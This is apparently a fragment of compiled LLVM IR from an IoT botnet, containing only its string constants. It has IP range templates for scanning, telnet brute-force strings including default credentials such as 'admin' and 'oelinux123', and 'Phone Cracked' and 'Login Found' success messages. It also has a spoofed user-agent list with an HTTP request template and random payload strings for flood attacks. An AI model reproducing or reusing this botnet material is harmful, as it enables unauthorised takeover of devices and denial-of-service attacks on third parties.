@.str.218 = private unnamed_addr constant [13 x i8] c"179.96.%d.%d\00", align 1
@.str.219 = private unnamed_addr constant [13 x i8] c"179.97.%d.%d\00", align 1
@.str.220 = private unnamed_addr constant [13 x i8] c"179.98.%d.%d\00", align 1
@.str.221 = private unnamed_addr constant [13 x i8] c"179.99.%d.%d\00", align 1
@.str.222 = private unnamed_addr constant [14 x i8] c"152.240.%d.%d\00", align 1
@.str.223 = private unnamed_addr constant [14 x i8] c"152.242.%d.%d\00", align 1
@.str.224 = private unnamed_addr constant [14 x i8] c"152.243.%d.%d\00", align 1
@.str.225 = private unnamed_addr constant [14 x i8] c"152.244.%d.%d\00", align 1
@.str.226 = private unnamed_addr constant [14 x i8] c"152.245.%d.%d\00", align 1
@.str.227 = private unnamed_addr constant [14 x i8] c"152.246.%d.%d\00", align 1
@.str.228 = private unnamed_addr constant [14 x i8] c"152.247.%d.%d\00", align 1
@.str.229 = private unnamed_addr constant [14 x i8] c"152.248.%d.%d\00", align 1
@.str.230 = private unnamed_addr constant [14 x i8] c"152.249.%d.%d\00", align 1
@.str.231 = private unnamed_addr constant [14 x i8] c"182.189.%d.%d\00", align 1
@.str.232 = private unnamed_addr constant [14 x i8] c"182.190.%d.%d\00", align 1
@.str.233 = private unnamed_addr constant [14 x i8] c"182.191.%d.%d\00", align 1
@.str.234 = private unnamed_addr constant [14 x i8] c"182.188.%d.%d\00", align 1
@.str.235 = private unnamed_addr constant [14 x i8] c"182.187.%d.%d\00", align 1
@.str.236 = private unnamed_addr constant [14 x i8] c"182.186.%d.%d\00", align 1
@.str.237 = private unnamed_addr constant [14 x i8] c"182.184.%d.%d\00", align 1
@.str.238 = private unnamed_addr constant [14 x i8] c"179.100.%d.%d\00", align 1
@.str.239 = private unnamed_addr constant [14 x i8] c"179.101.%d.%d\00", align 1
@.str.240 = private unnamed_addr constant [14 x i8] c"179.102.%d.%d\00", align 1
@.str.241 = private unnamed_addr constant [14 x i8] c"179.103.%d.%d\00", align 1
@.str.242 = private unnamed_addr constant [14 x i8] c"179.110.%d.%d\00", align 1
@.str.243 = private unnamed_addr constant [14 x i8] c"179.111.%d.%d\00", align 1
@.str.244 = private unnamed_addr constant [14 x i8] c"179.112.%d.%d\00", align 1
@.str.245 = private unnamed_addr constant [14 x i8] c"179.113.%d.%d\00", align 1
@.str.246 = private unnamed_addr constant [14 x i8] c"179.114.%d.%d\00", align 1
@.str.247 = private unnamed_addr constant [14 x i8] c"179.115.%d.%d\00", align 1
@.str.248 = private unnamed_addr constant [14 x i8] c"179.116.%d.%d\00", align 1
@.str.249 = private unnamed_addr constant [14 x i8] c"179.117.%d.%d\00", align 1
@.str.250 = private unnamed_addr constant [14 x i8] c"191.193.%d.%d\00", align 1
@.str.251 = private unnamed_addr constant [14 x i8] c"191.194.%d.%d\00", align 1
@.str.252 = private unnamed_addr constant [14 x i8] c"191.195.%d.%d\00", align 1
@.str.253 = private unnamed_addr constant [14 x i8] c"191.196.%d.%d\00", align 1
@.str.254 = private unnamed_addr constant [14 x i8] c"191.197.%d.%d\00", align 1
@.str.255 = private unnamed_addr constant [14 x i8] c"191.198.%d.%d\00", align 1
@.str.256 = private unnamed_addr constant [14 x i8] c"152.250.%d.%d\00", align 1
@.str.257 = private unnamed_addr constant [14 x i8] c"152.251.%d.%d\00", align 1
@.str.258 = private unnamed_addr constant [14 x i8] c"152.252.%d.%d\00", align 1
@.str.259 = private unnamed_addr constant [14 x i8] c"152.253.%d.%d\00", align 1
@.str.260 = private unnamed_addr constant [14 x i8] c"152.254.%d.%d\00", align 1
@.str.261 = private unnamed_addr constant [14 x i8] c"152.255.%d.%d\00", align 1
@.str.262 = private unnamed_addr constant [14 x i8] c"177.112.%d.%d\00", align 1
@.str.263 = private unnamed_addr constant [14 x i8] c"177.113.%d.%d\00", align 1
@.str.264 = private unnamed_addr constant [14 x i8] c"177.114.%d.%d\00", align 1
@.str.265 = private unnamed_addr constant [14 x i8] c"177.115.%d.%d\00", align 1
@.str.266 = private unnamed_addr constant [14 x i8] c"177.116.%d.%d\00", align 1
@.str.267 = private unnamed_addr constant [14 x i8] c"177.117.%d.%d\00", align 1
@.str.268 = private unnamed_addr constant [14 x i8] c"177.118.%d.%d\00", align 1
@.str.269 = private unnamed_addr constant [14 x i8] c"177.119.%d.%d\00", align 1
@.str.270 = private unnamed_addr constant [14 x i8] c"177.120.%d.%d\00", align 1
@.str.271 = private unnamed_addr constant [14 x i8] c"177.121.%d.%d\00", align 1
@.str.272 = private unnamed_addr constant [14 x i8] c"177.138.%d.%d\00", align 1
@.str.273 = private unnamed_addr constant [14 x i8] c"177.139.%d.%d\00", align 1
@.str.274 = private unnamed_addr constant [14 x i8] c"177.144.%d.%d\00", align 1
@.str.275 = private unnamed_addr constant [14 x i8] c"177.145.%d.%d\00", align 1
@.str.276 = private unnamed_addr constant [14 x i8] c"177.146.%d.%d\00", align 1
@.str.277 = private unnamed_addr constant [14 x i8] c"177.147.%d.%d\00", align 1
@.str.278 = private unnamed_addr constant [14 x i8] c"177.160.%d.%d\00", align 1
@.str.279 = private unnamed_addr constant [14 x i8] c"177.161.%d.%d\00", align 1
@.str.280 = private unnamed_addr constant [14 x i8] c"177.162.%d.%d\00", align 1
@.str.281 = private unnamed_addr constant [14 x i8] c"177.163.%d.%d\00", align 1
@.str.282 = private unnamed_addr constant [14 x i8] c"177.168.%d.%d\00", align 1
@.str.283 = private unnamed_addr constant [14 x i8] c"177.169.%d.%d\00", align 1
@.str.284 = private unnamed_addr constant [14 x i8] c"177.170.%d.%d\00", align 1
@.str.285 = private unnamed_addr constant [14 x i8] c"177.171.%d.%d\00", align 1
@.str.286 = private unnamed_addr constant [14 x i8] c"177.172.%d.%d\00", align 1
@.str.287 = private unnamed_addr constant [13 x i8] c"189.96.%d.%d\00", align 1
@.str.288 = private unnamed_addr constant [13 x i8] c"189.97.%d.%d\00", align 1
@.str.289 = private unnamed_addr constant [13 x i8] c"189.98.%d.%d\00", align 1
@.str.290 = private unnamed_addr constant [13 x i8] c"189.99.%d.%d\00", align 1
@.str.291 = private unnamed_addr constant [12 x i8] c"39.34.%d.%d\00", align 1
@.str.292 = private unnamed_addr constant [13 x i8] c"59.103.%d.%d\00", align 1
@.str.293 = private unnamed_addr constant [13 x i8] c"191.12.%d.%d\00", align 1
@.str.294 = private unnamed_addr constant [14 x i8] c"186.117.%d.%d\00", align 1
@.str.295 = private unnamed_addr constant [14 x i8] c"179.131.%d.%d\00", align 1
@.str.296 = private unnamed_addr constant [14 x i8] c"179.129.%d.%d\00", align 1
@.str.297 = private unnamed_addr constant [14 x i8] c"179.170.%d.%d\00", align 1
@.str.298 = private unnamed_addr constant [14 x i8] c"191.206.%d.%d\00", align 1
@.str.299 = private unnamed_addr constant [14 x i8] c"187.118.%d.%d\00", align 1
@.str.300 = private unnamed_addr constant [14 x i8] c"187.116.%d.%d\00", align 1
@.str.301 = private unnamed_addr constant [14 x i8] c"179.224.%d.%d\00", align 1
@.str.303 = private unnamed_addr constant [8 x i8] c"admin\0D\0A\00", align 1
@.str.304 = private unnamed_addr constant [109 x i8] c"\1B[31mPhone Cracked \1B[32m-> \1B[37m%s | \1B[31mUsername \1B[32m-> \1B[37madmin | \1B[31mPassword \1B[32m-> \1B[37madmin\1B[0m\00", align 1
@.str.305 = private unnamed_addr constant [5 x i8] c"su\0D\0A\00", align 1
@.str.306 = private unnamed_addr constant [13 x i8] c"oelinux123\0D\0A\00", align 1
@.str.307 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.308 = private unnamed_addr constant [21 x i8] c"[Attempt] - %s:%s:%s\00", align 1
@.str.309 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.310 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.311 = private unnamed_addr constant [34 x i8] c"[Success] [Login Found]- %s:%s:%s\00", align 1
@sendHTTP.useragents = private unnamed_addr constant [62 x i8*] [i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.312, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.313, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.314, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.315, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.316, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.317, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.318, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.319, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.320, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.321, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.322, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.323, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.324, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.325, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.326, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.327, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.328, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.329, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.330, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.331, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.332, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.333, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.334, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.335, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.336, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.337, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.338, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.339, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.340, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @.str.341, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.342, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.343, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.344, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.345, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.346, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.347, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.348, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.349, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.350, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.351, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.352, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.353, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.354, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.355, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.356, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.357, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.358, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.359, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.360, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.361, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.362, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.363, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.364, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.365, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.366, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.367, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.368, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.369, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.370, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.371, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.372, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.373, i32 0, i32 0)], align 16
@sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.374, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.375, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.376, i32 0, i32 0)], align 16
@.str.377 = private unnamed_addr constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00", align 1
@.str.374 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.375 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.376 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.312 = private unnamed_addr constant [63 x i8] c"Mozilla/5.0  (compatible; Konqueror/3.0; i686 Linux; 20021117)\00", align 1
@.str.313 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00", align 1
@.str.314 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.315 = private unnamed_addr constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00", align 1
@.str.316 = private unnamed_addr constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00", align 1
@.str.317 = private unnamed_addr constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00", align 1
@.str.318 = private unnamed_addr constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00", align 1
@.str.319 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00", align 1
@.str.320 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00", align 1
@.str.321 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00", align 1
@.str.322 = private unnamed_addr constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00", align 1
@.str.323 = private unnamed_addr constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.324 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.325 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.326 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.327 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.328 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.329 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.330 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.331 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.332 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.333 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.334 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.335 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.336 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.337 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.338 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.339 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.340 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.341 = private unnamed_addr constant [140 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.342 = private unnamed_addr constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.343 = private unnamed_addr constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.344 = private unnamed_addr constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.345 = private unnamed_addr constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.346 = private unnamed_addr constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00", align 1
@.str.347 = private unnamed_addr constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00", align 1
@.str.348 = private unnamed_addr constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00", align 1
@.str.349 = private unnamed_addr constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00", align 1
@.str.350 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00", align 1
@.str.351 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00", align 1
@.str.352 = private unnamed_addr constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00", align 1
@.str.353 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00", align 1
@.str.354 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00", align 1
@.str.355 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00", align 1
@.str.356 = private unnamed_addr constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00", align 1
@.str.357 = private unnamed_addr constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00", align 1
@.str.358 = private unnamed_addr constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00", align 1
@.str.359 = private unnamed_addr constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00", align 1
@.str.360 = private unnamed_addr constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00", align 1
@.str.361 = private unnamed_addr constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00", align 1
@.str.362 = private unnamed_addr constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00", align 1
@.str.363 = private unnamed_addr constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00", align 1
@.str.364 = private unnamed_addr constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00", align 1
@.str.365 = private unnamed_addr constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00", align 1
@.str.366 = private unnamed_addr constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00", align 1
@.str.367 = private unnamed_addr constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00", align 1
@.str.368 = private unnamed_addr constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00", align 1
@.str.369 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00", align 1
@.str.370 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00", align 1
@.str.371 = private unnamed_addr constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00", align 1
@.str.372 = private unnamed_addr constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00", align 1
@.str.373 = private unnamed_addr constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.378, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.379, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.380, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.381, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.382, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.383, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.384, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.385, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.386, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.387, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.388, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.389, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.390, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.391, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.392, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.393, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.394, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.395, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.396, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.397, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.398, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.399, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.400, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.401, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.402, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.403, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.404, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.405, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.406, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.407, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.408, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.409, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.410, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.411, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.412, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.413, i32 0, i32 0)], align 16
@.str.378 = private unnamed_addr constant [6 x i8] c"arfgG\00", align 1
@.str.379 = private unnamed_addr constant [9 x i8] c"HBiug655\00", align 1
@.str.380 = private unnamed_addr constant [13 x i8] c"KJYDFyljf754\00", align 1
@.str.381 = private unnamed_addr constant [20 x i8] c"LIKUGilkut769458905\00", align 1
@.str.382 = private unnamed_addr constant [17 x i8] c"JHFDSkgfc5747694\00", align 1
@.str.383 = private unnamed_addr constant [12 x i8] c"GJjyur67458\00", align 1
@.str.384 = private unnamed_addr constant [12 x i8] c"RYSDk747586\00", align 1
@.str.385 = private unnamed_addr constant [12 x i8] c"HKJGi5r8675\00", align 1
@.str.386 = private unnamed_addr constant [10 x i8] c"KHGK7985i\00", align 1
@.str.387 = private unnamed_addr constant [11 x i8] c"yuituiILYF\00", align 1
@.str.388 = private unnamed_addr constant [14 x i8] c"GKJDghfcjkgd4\00", align 1
@.str.389 = private unnamed_addr constant [12 x i8] c"uygtfgtrevf\00", align 1
@.str.390 = private unnamed_addr constant [13 x i8] c"tyeuhygbtfvg\00", align 1
@.str.391 = private unnamed_addr constant [9 x i8] c"ewqdcftr\00", align 1
@.str.392 = private unnamed_addr constant [16 x i8] c"trbazetghhnbrty\00", align 1
@.str.393 = private unnamed_addr constant [11 x i8] c"tbhrwsehbg\00", align 1
@.str.394 = private unnamed_addr constant [12 x i8] c"twehgbferhb\00", align 1
@.str.395 = private unnamed_addr constant [12 x i8] c"etrbhhgetrb\00", align 1
@.str.396 = private unnamed_addr constant [14 x i8] c"edfverthbyrtb\00", align 1
@.str.397 = private unnamed_addr constant [14 x i8] c"kmiujmnhnhfgn\00", align 1
@.str.398 = private unnamed_addr constant [14 x i8] c"zcdbvgdfsbgfd\00", align 1
@.str.399 = private unnamed_addr constant [10 x i8] c"gdfbtsdgb\00", align 1
@.str.400 = private unnamed_addr constant [14 x i8] c"ghdugffytsdyt\00", align 1
@.str.401 = private unnamed_addr constant [14 x i8] c"tgerthgwtrwry\00", align 1
@.str.402 = private unnamed_addr constant [12 x i8] c"yteytietyue\00", align 1
@.str.403 = private unnamed_addr constant [9 x i8] c"qsortEQS\00", align 1
@.str.404 = private unnamed_addr constant [16 x i8] c"8969876hjkghblk\00", align 1
@.str.405 = private unnamed_addr constant [4 x i8] c"std\00", align 1
